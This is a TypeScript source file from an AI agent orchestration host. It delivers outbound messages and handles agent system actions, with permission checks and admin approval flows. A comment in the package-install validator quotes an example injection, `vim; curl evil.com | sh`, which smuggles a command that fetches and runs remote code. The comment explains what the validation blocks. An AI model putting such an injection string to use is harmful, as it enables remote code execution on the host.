/**
 * Outbound message delivery.
 * Polls session outbound DBs for undelivered messages, delivers through channel adapters.
 *
 * Two-DB architecture:
 *   - Reads messages_out from outbound.db (container-owned, opened read-only)
 *   - Tracks delivery in inbound.db's `delivered` table (host-owned)
 *   - Never writes to outbound.db — preserves single-writer-per-file invariant
 */
import type Database from 'better-sqlite3';
import fs from 'fs';
import path from 'path';

import { readCoworkerTypes } from './claude-composer.js';
import { GROUPS_DIR } from './config.js';
import {
  getRunningSessions,
  getActiveSessions,
  createPendingQuestion,
  getSession,
  createPendingApproval,
  updatePendingApprovalDelivery,
} from './db/sessions.js';
import {
  getAgentGroup,
  getAdminAgentGroup,
  createAgentGroup,
  updateAgentGroup,
  getAgentGroupByFolder,
} from './db/agent-groups.js';
import {
  allocateDestinationName,
  createDestination,
  getDestinationByName,
  getDestinationByTarget,
  hasDestination,
  normalizeName,
} from './db/agent-destinations.js';
import {
  getMessagingGroup,
  getMessagingGroupByPlatform,
  getMessagingGroupsByAgentGroup,
  createMessagingGroupAgent,
  getMessagingGroupAgents,
} from './db/messaging-groups.js';
import {
  getDueOutboundMessages,
  getDeliveredIds,
  markDelivered,
  markDeliveryFailed,
  migrateDeliveredTable,
  insertTask,
  cancelTask,
  pauseTask,
  resumeTask,
} from './db/session-db.js';
import { log } from './log.js';
import {
  openInboundDb,
  openOutboundDb,
  sessionDir,
  inboundDbPath,
  resolveSession,
  writeDestinations,
  writeSessionMessage,
  writeSystemResponse,
} from './session-manager.js';
import { resetContainerIdleTimer, wakeContainer } from './container-runner.js';
import { initGroupFilesystem } from './group-init.js';
import type { OutboundFile } from './channels/adapter.js';
import type { AgentGroup, Session } from './types.js';

const ACTIVE_POLL_MS = 1000;
const SWEEP_POLL_MS = 60_000;
const MAX_DELIVERY_ATTEMPTS = 3;

/** Track delivery attempt counts. Resets on process restart (gives failed messages a fresh chance). */
const deliveryAttempts = new Map<string, number>();

export function shouldRetainOutboxFiles(channelType: string | null, files?: OutboundFile[]): boolean {
  return channelType === 'dashboard' && Boolean(files?.length);
}

export interface ChannelDeliveryAdapter {
  deliver(
    channelType: string,
    platformId: string,
    threadId: string | null,
    kind: string,
    content: string,
    files?: OutboundFile[],
  ): Promise<string | undefined>;
  setTyping?(channelType: string, platformId: string, threadId: string | null): Promise<void>;
}

let deliveryAdapter: ChannelDeliveryAdapter | null = null;
let activePolling = false;
let sweepPolling = false;

export function setDeliveryAdapter(adapter: ChannelDeliveryAdapter): void {
  deliveryAdapter = adapter;
}

/**
 * Deliver a system notification to an agent as a regular chat message.
 * Used for fire-and-forget responses from host actions (create_agent result,
 * approval outcomes, etc.). The agent sees it as an inbound chat message
 * with sender="system".
 */
function notifyAgent(session: Session, text: string): void {
  writeSessionMessage(session.agent_group_id, session.id, {
    id: `sys-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
    kind: 'chat',
    timestamp: new Date().toISOString(),
    platformId: session.agent_group_id,
    channelType: 'agent',
    threadId: null,
    content: JSON.stringify({ text, sender: 'system', senderId: 'system' }),
  });
  // Wake the container so it picks up the notification promptly
  const fresh = getSession(session.id);
  if (fresh) {
    wakeContainer(fresh).catch((err) => log.error('Failed to wake container after notification', { err }));
  }
}

/**
 * Send an approval request to the admin channel and record a pending_approval row.
 * The admin's button click routes via the existing ncq: card infrastructure to
 * handleApprovalResponse in index.ts, which completes the action.
 */
async function requestApproval(
  session: Session,
  agentName: string,
  action: 'install_packages' | 'request_rebuild' | 'add_mcp_server',
  payload: Record<string, unknown>,
  question: string,
): Promise<void> {
  const adminGroup = getAdminAgentGroup();
  const adminMGs = adminGroup ? getMessagingGroupsByAgentGroup(adminGroup.id) : [];
  if (adminMGs.length === 0) {
    notifyAgent(session, `${action} failed: no admin channel configured for approvals.`);
    return;
  }
  const adminChannel = adminMGs[0];

  const approvalId = `appr-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
  createPendingApproval({
    approval_id: approvalId,
    session_id: session.id,
    request_id: approvalId,
    action,
    payload: JSON.stringify(payload),
    created_at: new Date().toISOString(),
    agent_group_id: session.agent_group_id,
    channel_type: adminChannel.channel_type,
    platform_id: adminChannel.platform_id,
    platform_message_id: null,
    status: 'pending',
  });

  if (deliveryAdapter) {
    try {
      const platformMessageId = await deliveryAdapter.deliver(
        adminChannel.channel_type,
        adminChannel.platform_id,
        null,
        'chat-sdk',
        JSON.stringify({
          type: 'ask_question',
          questionId: approvalId,
          question,
          options: ['Approve', 'Reject'],
        }),
      );
      updatePendingApprovalDelivery(approvalId, {
        channel_type: adminChannel.channel_type,
        platform_id: adminChannel.platform_id,
        platform_message_id: platformMessageId ?? null,
      });
    } catch (err) {
      log.error('Failed to deliver approval card', { action, approvalId, err });
      notifyAgent(session, `${action} failed: could not deliver approval request to admin.`);
      return;
    }
  }

  log.info('Approval requested', {
    action,
    approvalId,
    agentName,
    channelType: adminChannel.channel_type,
    platformId: adminChannel.platform_id,
  });
}

/** Show typing indicator on a channel. Called when a message is routed to the agent. */
export async function triggerTyping(channelType: string, platformId: string, threadId: string | null): Promise<void> {
  try {
    await deliveryAdapter?.setTyping?.(channelType, platformId, threadId);
  } catch {
    // Typing is best-effort — don't fail routing if it errors
  }
}

/** Start the active container poll loop (~1s). */
export function startActiveDeliveryPoll(): void {
  if (activePolling) return;
  activePolling = true;
  pollActive();
}

/** Start the sweep poll loop (~60s). */
export function startSweepDeliveryPoll(): void {
  if (sweepPolling) return;
  sweepPolling = true;
  pollSweep();
}

async function pollActive(): Promise<void> {
  if (!activePolling) return;

  try {
    const sessions = getRunningSessions();
    for (const session of sessions) {
      await deliverSessionMessages(session);
    }
  } catch (err) {
    log.error('Active delivery poll error', { err });
  }

  setTimeout(pollActive, ACTIVE_POLL_MS);
}

async function pollSweep(): Promise<void> {
  if (!sweepPolling) return;

  try {
    const sessions = getActiveSessions();
    for (const session of sessions) {
      await deliverSessionMessages(session);
    }
  } catch (err) {
    log.error('Sweep delivery poll error', { err });
  }

  setTimeout(pollSweep, SWEEP_POLL_MS);
}

async function deliverSessionMessages(session: Session): Promise<void> {
  const agentGroup = getAgentGroup(session.agent_group_id);
  if (!agentGroup) return;

  let outDb: Database.Database;
  let inDb: Database.Database;
  try {
    outDb = openOutboundDb(agentGroup.id, session.id);
    inDb = openInboundDb(agentGroup.id, session.id);
  } catch {
    return; // DBs might not exist yet
  }

  try {
    // Read all due messages from outbound.db (read-only)
    const allDue = getDueOutboundMessages(outDb);
    if (allDue.length === 0) return;

    // Filter out already-delivered messages using inbound.db's delivered table
    const delivered = getDeliveredIds(inDb);
    const undelivered = allDue.filter((m) => !delivered.has(m.id));
    if (undelivered.length === 0) return;

    // Ensure platform_message_id column exists (migration for existing sessions)
    migrateDeliveredTable(inDb);

    for (const msg of undelivered) {
      try {
        const platformMsgId = await deliverMessage(msg, session, inDb);
        markDelivered(inDb, msg.id, platformMsgId ?? null);
        deliveryAttempts.delete(msg.id);
        resetContainerIdleTimer(session.id);
      } catch (err) {
        const attempts = (deliveryAttempts.get(msg.id) ?? 0) + 1;
        deliveryAttempts.set(msg.id, attempts);
        if (attempts >= MAX_DELIVERY_ATTEMPTS) {
          log.error('Message delivery failed permanently, giving up', {
            messageId: msg.id,
            sessionId: session.id,
            attempts,
            err,
          });
          markDeliveryFailed(inDb, msg.id);
          deliveryAttempts.delete(msg.id);
        } else {
          log.warn('Message delivery failed, will retry', {
            messageId: msg.id,
            sessionId: session.id,
            attempt: attempts,
            maxAttempts: MAX_DELIVERY_ATTEMPTS,
            err,
          });
        }
      }
    }
  } finally {
    outDb.close();
    inDb.close();
  }
}

async function deliverMessage(
  msg: {
    id: string;
    kind: string;
    platform_id: string | null;
    channel_type: string | null;
    thread_id: string | null;
    content: string;
  },
  session: Session,
  inDb: Database.Database,
): Promise<string | undefined> {
  if (!deliveryAdapter) {
    log.warn('No delivery adapter configured, dropping message', { id: msg.id });
    return;
  }

  const content = JSON.parse(msg.content);

  // System actions — handle internally (schedule_task, cancel_task, etc.)
  if (msg.kind === 'system') {
    await handleSystemAction(content, session, inDb);
    return;
  }

  // Agent-to-agent — route to target session (with permission check).
  // Permission is enforced via agent_destinations — the source agent must have
  // a row for the target. Content is copied verbatim; the target's formatter
  // will look up the source agent in its own local map to display a name.
  if (msg.channel_type === 'agent') {
    const targetAgentGroupId = msg.platform_id;
    if (!targetAgentGroupId) {
      log.warn('Agent message missing target agent group ID', { id: msg.id });
      return;
    }
    if (!hasDestination(session.agent_group_id, 'agent', targetAgentGroupId)) {
      log.warn('Unauthorized agent-to-agent message — dropping', {
        source: session.agent_group_id,
        target: targetAgentGroupId,
      });
      return;
    }
    if (!getAgentGroup(targetAgentGroupId)) {
      log.warn('Target agent group not found', { id: msg.id, targetAgentGroupId });
      return;
    }
    const { session: targetSession } = resolveSession(targetAgentGroupId, null, null, 'agent-shared');
    writeSessionMessage(targetAgentGroupId, targetSession.id, {
      id: `a2a-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
      kind: 'chat',
      timestamp: new Date().toISOString(),
      platformId: session.agent_group_id,
      channelType: 'agent',
      threadId: null,
      content: msg.content,
    });
    log.info('Agent message routed', {
      from: session.agent_group_id,
      to: targetAgentGroupId,
      targetSession: targetSession.id,
    });
    const fresh = getSession(targetSession.id);
    if (fresh) await wakeContainer(fresh);
    return;
  }

  // Permission check: the source agent must have a destination row for this target.
  // Defense in depth — the container already validates via its local map, but the
  // host's central DB is the authoritative ACL.
  if (msg.channel_type && msg.platform_id) {
    const mg = getMessagingGroupByPlatform(msg.channel_type, msg.platform_id);
    if (!mg || !hasDestination(session.agent_group_id, 'channel', mg.id)) {
      log.warn('Unauthorized channel destination — dropping message', {
        sourceAgentGroup: session.agent_group_id,
        channelType: msg.channel_type,
        platformId: msg.platform_id,
      });
      return;
    }
  }

  // Track pending questions for ask_user_question flow
  if (content.type === 'ask_question' && content.questionId) {
    createPendingQuestion({
      question_id: content.questionId,
      session_id: session.id,
      message_out_id: msg.id,
      platform_id: msg.platform_id,
      channel_type: msg.channel_type,
      thread_id: msg.thread_id,
      created_at: new Date().toISOString(),
    });
    log.info('Pending question created', { questionId: content.questionId, sessionId: session.id });
  }

  // Channel delivery
  if (!msg.channel_type || !msg.platform_id) {
    log.warn('Message missing routing fields', { id: msg.id });
    return;
  }

  // Read file attachments from outbox if the content declares files
  let files: OutboundFile[] | undefined;
  const outboxDir = path.join(sessionDir(session.agent_group_id, session.id), 'outbox', msg.id);
  if (Array.isArray(content.files) && content.files.length > 0 && fs.existsSync(outboxDir)) {
    files = [];
    for (const filename of content.files as string[]) {
      const filePath = path.join(outboxDir, filename);
      if (fs.existsSync(filePath)) {
        files.push({ filename, data: fs.readFileSync(filePath) });
      } else {
        log.warn('Outbox file not found', { messageId: msg.id, filename });
      }
    }
    if (files.length === 0) files = undefined;
  }

  const platformMsgId = await deliveryAdapter.deliver(
    msg.channel_type,
    msg.platform_id,
    msg.thread_id,
    msg.kind,
    msg.content,
    files,
  );
  log.info('Message delivered', {
    id: msg.id,
    channelType: msg.channel_type,
    platformId: msg.platform_id,
    platformMsgId,
    fileCount: files?.length,
  });

  // Dashboard reads attachment files directly from the session outbox, so those
  // files must persist after delivery instead of being treated as transport-only.
  if (fs.existsSync(outboxDir) && !shouldRetainOutboxFiles(msg.channel_type, files)) {
    fs.rmSync(outboxDir, { recursive: true, force: true });
  }

  return platformMsgId;
}

/**
 * Handle system actions from the container agent.
 * These are written to messages_out because the container can't write to inbound.db.
 * The host applies them to inbound.db here.
 */
async function handleSystemAction(
  content: Record<string, unknown>,
  session: Session,
  inDb: Database.Database,
): Promise<void> {
  const action = content.action as string;
  log.info('System action from agent', { sessionId: session.id, action });

  switch (action) {
    case 'schedule_task': {
      const taskId = content.taskId as string;
      const prompt = content.prompt as string;
      const script = content.script as string | null;
      const processAfter = content.processAfter as string;
      const recurrence = (content.recurrence as string) || null;

      insertTask(inDb, {
        id: taskId,
        processAfter,
        recurrence,
        platformId: (content.platformId as string) ?? null,
        channelType: (content.channelType as string) ?? null,
        threadId: (content.threadId as string) ?? null,
        content: JSON.stringify({ prompt, script }),
      });
      log.info('Scheduled task created', { taskId, processAfter, recurrence });
      break;
    }

    case 'cancel_task': {
      const taskId = content.taskId as string;
      cancelTask(inDb, taskId);
      log.info('Task cancelled', { taskId });
      break;
    }

    case 'pause_task': {
      const taskId = content.taskId as string;
      pauseTask(inDb, taskId);
      log.info('Task paused', { taskId });
      break;
    }

    case 'resume_task': {
      const taskId = content.taskId as string;
      resumeTask(inDb, taskId);
      log.info('Task resumed', { taskId });
      break;
    }

    case 'create_agent': {
      const requestId = content.requestId as string;
      const name = content.name as string;
      const instructions = content.instructions as string | null;

      const sourceGroup = getAgentGroup(session.agent_group_id);
      if (!sourceGroup?.is_admin) {
        // Notify the agent via a chat message (fire-and-forget pattern)
        notifyAgent(session, `Your create_agent request for "${name}" was rejected: admin permission required.`);
        log.warn('create_agent denied (not admin)', { sessionAgentGroup: session.agent_group_id, name });
        break;
      }

      const localName = normalizeName(name);

      // Collision in the creator's destination namespace
      if (getDestinationByName(sourceGroup.id, localName)) {
        notifyAgent(session, `Cannot create agent "${name}": you already have a destination named "${localName}".`);
        break;
      }

      // Derive a safe folder name, deduplicated globally across agent_groups.folder
      let folder = localName;
      let suffix = 2;
      while (getAgentGroupByFolder(folder)) {
        folder = `${localName}-${suffix}`;
        suffix++;
      }

      const groupPath = path.join(GROUPS_DIR, folder);
      const resolvedPath = path.resolve(groupPath);
      const resolvedGroupsDir = path.resolve(GROUPS_DIR);
      if (!resolvedPath.startsWith(resolvedGroupsDir + path.sep)) {
        notifyAgent(session, `Cannot create agent "${name}": invalid folder path.`);
        log.error('create_agent path traversal attempt', { folder, resolvedPath });
        break;
      }

      const agentGroupId = `ag-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
      const now = new Date().toISOString();
      const requestedCoworkerType =
        typeof content.coworkerType === 'string' && content.coworkerType.trim() ? content.coworkerType.trim() : null;
      let coworkerType = requestedCoworkerType;
      let creationNote: string | null = null;
      if (requestedCoworkerType) {
        const knownTypes = readCoworkerTypes();
        const roles = requestedCoworkerType
          .split('+')
          .map((role) => role.trim())
          .filter(Boolean);
        const unknownRoles = roles.filter((role) => !knownTypes[role]);
        const looksLikePlaceholder =
          requestedCoworkerType.includes('coworker-types.json') ||
          requestedCoworkerType.includes('<') ||
          requestedCoworkerType.includes('>');
        if (looksLikePlaceholder || unknownRoles.length > 0) {
          coworkerType = null;
          creationNote = looksLikePlaceholder
            ? `Requested coworkerType "${requestedCoworkerType}" looked like a placeholder, so the agent was created as untyped.`
            : `Requested coworkerType "${requestedCoworkerType}" is not in the coworker type registry (container/skills/*/coworker-types.yaml), so the agent was created as untyped.`;
          log.warn('create_agent falling back to untyped coworker', {
            requestedCoworkerType,
            unknownRoles,
            looksLikePlaceholder,
          });
        }
      }

      const newGroup: AgentGroup = {
        id: agentGroupId,
        name,
        folder,
        is_admin: 0,
        agent_provider: (content.agentProvider as string) || null,
        container_config: null,
        coworker_type: coworkerType,
        allowed_mcp_tools: content.allowedMcpTools
          ? JSON.stringify((content.allowedMcpTools as string[]).filter((t) => t.startsWith('mcp__')))
          : null,
        created_at: now,
      };
      createAgentGroup(newGroup);

      initGroupFilesystem(newGroup, {});

      // Resolve instruction overlay — prepended to .instructions.md
      const overlayName = (content.instructionOverlay as string) || 'thorough-analyst';
      const overlayDir = path.join(GROUPS_DIR, 'templates', 'instructions');
      const overlayPath = path.join(overlayDir, `${overlayName}.md`);
      let overlayContent = '';
      if (fs.existsSync(overlayPath)) {
        overlayContent = fs.readFileSync(overlayPath, 'utf-8').trimEnd();
      } else if (overlayName !== 'thorough-analyst') {
        log.warn('Unknown instruction overlay, falling back to thorough-analyst', { overlayName });
        const fallback = path.join(overlayDir, 'thorough-analyst.md');
        if (fs.existsSync(fallback)) {
          overlayContent = fs.readFileSync(fallback, 'utf-8').trimEnd();
        }
      }

      // Always write to .instructions.md — CLAUDE.md is system-composed from
      // templates + .instructions.md on every container wake
      const parts: string[] = [];
      if (overlayContent) parts.push(overlayContent);
      if (instructions) parts.push(instructions);
      if (parts.length > 0) {
        fs.writeFileSync(path.join(groupPath, '.instructions.md'), parts.join('\n\n'));
      }

      // Insert bidirectional destination rows (= ACL grants).
      // Creator refers to child by the name it chose; child refers to creator as "parent".
      createDestination({
        agent_group_id: sourceGroup.id,
        local_name: localName,
        target_type: 'agent',
        target_id: agentGroupId,
        created_at: now,
      });
      // Handle the unlikely case where the child already has a "parent" destination
      // (shouldn't happen for a brand-new agent, but be safe).
      let parentName = 'parent';
      let parentSuffix = 2;
      while (getDestinationByName(agentGroupId, parentName)) {
        parentName = `parent-${parentSuffix}`;
        parentSuffix++;
      }
      createDestination({
        agent_group_id: agentGroupId,
        local_name: parentName,
        target_type: 'agent',
        target_id: sourceGroup.id,
        created_at: now,
      });

      // Wire the new coworker into the conversation that created it (not all
      // admin channels). This scopes coworkers to the channel where they were
      // requested — they don't leak into unrelated channels.
      const mg = session.messaging_group_id ? getMessagingGroup(session.messaging_group_id) : null;
      if (mg) {
        const existing = getMessagingGroupAgents(mg.id);
        const alreadyWired = existing.some((a) => a.agent_group_id === agentGroupId);
        if (!alreadyWired) {
          createMessagingGroupAgent({
            id: `mga-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
            messaging_group_id: mg.id,
            agent_group_id: agentGroupId,
            trigger_rules: JSON.stringify({ pattern: `@${localName}\\b`, requiresTrigger: true }),
            response_scope: 'triggered',
            session_mode: 'shared',
            priority: 0,
            created_at: now,
          });
        }

        // Grant the coworker a channel destination so it can reply back.
        const destPreferredName = mg.name
          ? `${mg.name}-${mg.channel_type}`
          : `${mg.channel_type}-${mg.platform_id.slice(-8)}`;
        const destName = allocateDestinationName(agentGroupId, destPreferredName);
        createDestination({
          agent_group_id: agentGroupId,
          local_name: destName,
          target_type: 'channel',
          target_id: mg.id,
          created_at: now,
        });
      }

      // Refresh the creator's destination map so the new child appears
      // immediately on the next query — no restart needed.
      writeDestinations(session.agent_group_id, session.id);

      // Refresh channel adapters so they learn about the new coworker's
      // trigger rules without requiring a restart.
      try {
        const { refreshAdapterConversations } = await import('./index.js');
        refreshAdapterConversations();
      } catch (refreshErr) {
        log.warn('Failed to refresh adapter conversations after create_agent', { err: refreshErr });
      }

      // Fire-and-forget notification back to the creator
      notifyAgent(
        session,
        `Agent "${localName}" created. You can now message it with <message to="${localName}">...</message>.${creationNote ? `\n${creationNote}` : ''}`,
      );
      log.info('Agent group created', { agentGroupId, name, localName, folder, parent: sourceGroup.id });
      // Note: requestId is unused — this is fire-and-forget, not request/response.
      void requestId;
      break;
    }

    case 'wire_agents': {
      const sourceGroup = getAgentGroup(session.agent_group_id);
      if (!sourceGroup?.is_admin) {
        notifyAgent(session, 'wire_agents denied: admin permission required.');
        break;
      }

      const agentAName = content.agentA as string;
      const agentBName = content.agentB as string;

      // Resolve both names in the admin's destination map
      const destA = getDestinationByName(sourceGroup.id, agentAName);
      const destB = getDestinationByName(sourceGroup.id, agentBName);
      if (!destA || destA.target_type !== 'agent') {
        notifyAgent(session, `wire_agents failed: "${agentAName}" is not an agent destination.`);
        break;
      }
      if (!destB || destB.target_type !== 'agent') {
        notifyAgent(session, `wire_agents failed: "${agentBName}" is not an agent destination.`);
        break;
      }
      if (destA.target_id === destB.target_id) {
        notifyAgent(session, `wire_agents failed: both names resolve to the same agent.`);
        break;
      }

      const agGroupA = destA.target_id;
      const agGroupB = destB.target_id;
      const now = new Date().toISOString();
      const results: string[] = [];

      // A → B (idempotent: check if link already exists)
      const existingAtoB = getDestinationByTarget(agGroupA, 'agent', agGroupB);
      if (existingAtoB) {
        results.push(`"${agentAName}" already reaches "${agentBName}" as "${existingAtoB.local_name}" (reused).`);
      } else {
        const nameForB = allocateDestinationName(agGroupA, agentBName);
        createDestination({
          agent_group_id: agGroupA,
          local_name: nameForB,
          target_type: 'agent',
          target_id: agGroupB,
          created_at: now,
        });
        results.push(`"${agentAName}" can now reach "${agentBName}" as "${nameForB}".`);
      }

      // B → A (idempotent)
      const existingBtoA = getDestinationByTarget(agGroupB, 'agent', agGroupA);
      if (existingBtoA) {
        results.push(`"${agentBName}" already reaches "${agentAName}" as "${existingBtoA.local_name}" (reused).`);
      } else {
        const nameForA = allocateDestinationName(agGroupB, agentAName);
        createDestination({
          agent_group_id: agGroupB,
          local_name: nameForA,
          target_type: 'agent',
          target_id: agGroupA,
          created_at: now,
        });
        results.push(`"${agentBName}" can now reach "${agentAName}" as "${nameForA}".`);
      }

      // Refresh destination maps for all active sessions of both agents
      const allSessions = getActiveSessions();
      for (const s of allSessions) {
        if (s.agent_group_id === agGroupA || s.agent_group_id === agGroupB) {
          writeDestinations(s.agent_group_id, s.id);
        }
      }

      notifyAgent(session, `Peer wiring complete:\n${results.join('\n')}`);
      log.info('Peer agents wired', { agentA: agentAName, agentB: agentBName, groupA: agGroupA, groupB: agGroupB });
      break;
    }

    case 'add_mcp_server': {
      const agentGroup = getAgentGroup(session.agent_group_id);
      if (!agentGroup) {
        notifyAgent(session, 'add_mcp_server failed: agent group not found.');
        break;
      }
      const serverName = content.name as string;
      const command = content.command as string;
      if (!serverName || !command) {
        notifyAgent(session, 'add_mcp_server failed: name and command are required.');
        break;
      }
      await requestApproval(
        session,
        agentGroup.name,
        'add_mcp_server',
        {
          name: serverName,
          command,
          args: (content.args as string[]) || [],
          env: (content.env as Record<string, string>) || {},
        },
        `Agent "${agentGroup.name}" requests a new MCP server:\n${serverName} (${command})`,
      );
      break;
    }

    case 'install_packages': {
      const agentGroup = getAgentGroup(session.agent_group_id);
      if (!agentGroup) {
        notifyAgent(session, 'install_packages failed: agent group not found.');
        break;
      }

      const apt = (content.apt as string[]) || [];
      const npm = (content.npm as string[]) || [];
      const reason = (content.reason as string) || '';

      // Host-side sanitization (defense in depth — container should validate first).
      // Strict allowlist: Debian/npm naming rules only. Blocks shell injection via
      // package names like `vim; curl evil.com | sh`.
      const APT_RE = /^[a-z0-9][a-z0-9._+-]*$/;
      const NPM_RE = /^(@[a-z0-9][a-z0-9._-]*\/)?[a-z0-9][a-z0-9._-]*$/;
      const MAX_PACKAGES = 20;
      if (apt.length + npm.length === 0) {
        notifyAgent(session, 'install_packages failed: at least one apt or npm package is required.');
        break;
      }
      if (apt.length + npm.length > MAX_PACKAGES) {
        notifyAgent(session, `install_packages failed: max ${MAX_PACKAGES} packages per request.`);
        break;
      }
      const invalidApt = apt.find((p) => !APT_RE.test(p));
      if (invalidApt) {
        notifyAgent(session, `install_packages failed: invalid apt package name "${invalidApt}".`);
        log.warn('install_packages: invalid apt package rejected', { pkg: invalidApt });
        break;
      }
      const invalidNpm = npm.find((p) => !NPM_RE.test(p));
      if (invalidNpm) {
        notifyAgent(session, `install_packages failed: invalid npm package name "${invalidNpm}".`);
        log.warn('install_packages: invalid npm package rejected', { pkg: invalidNpm });
        break;
      }

      const packageList = [...apt.map((p) => `apt: ${p}`), ...npm.map((p) => `npm: ${p}`)].join(', ');
      await requestApproval(
        session,
        agentGroup.name,
        'install_packages',
        { apt, npm, reason },
        `Agent "${agentGroup.name}" requests package installation:\n${packageList}${reason ? `\nReason: ${reason}` : ''}`,
      );
      break;
    }

    case 'request_rebuild': {
      const agentGroup = getAgentGroup(session.agent_group_id);
      if (!agentGroup) {
        notifyAgent(session, 'request_rebuild failed: agent group not found.');
        break;
      }
      const reason = (content.reason as string) || '';
      await requestApproval(
        session,
        agentGroup.name,
        'request_rebuild',
        { reason },
        `Agent "${agentGroup.name}" requests a container rebuild.${reason ? `\nReason: ${reason}` : ''}`,
      );
      break;
    }

    case 'request_credential': {
      const { handleCredentialRequest } = await import('./credentials.js');
      await handleCredentialRequest(content, session);
      break;
    }

    case 'append_learning': {
      const title = content.title as string;
      const body = content.content as string;
      if (!title || !body) {
        notifyAgent(session, 'append_learning failed: title and content are required.');
        break;
      }
      const globalDir = path.join(GROUPS_DIR, 'global', 'learnings');
      fs.mkdirSync(globalDir, { recursive: true });

      const slug = title
        .toLowerCase()
        .replace(/[^a-z0-9]+/g, '-')
        .replace(/^-+|-+$/g, '')
        .slice(0, 50);
      const filename = `${Date.now()}-${slug}.md`;
      fs.writeFileSync(path.join(globalDir, filename), `# ${title}\n\n${body}\n`);

      // Rebuild INDEX.md
      const files = fs
        .readdirSync(globalDir)
        .filter((f) => f.endsWith('.md') && f !== 'INDEX.md')
        .sort();
      const indexLines = ['# Shared Learnings Index\n'];
      for (const f of files) {
        const displayName = f.replace(/^\d+-/, '').replace(/\.md$/, '').replace(/-/g, ' ');
        indexLines.push(`- [${displayName}](${f})`);
      }
      fs.writeFileSync(path.join(globalDir, 'INDEX.md'), indexLines.join('\n') + '\n');

      notifyAgent(session, `Learning saved: ${title}`);
      log.info('Shared learning appended', { title, filename });
      break;
    }

    default:
      log.warn('Unknown system action', { action });
  }
}

export function stopDeliveryPolls(): void {
  activePolling = false;
  sweepPolling = false;
}

export const __testHooks = {
  handleSystemAction,
};
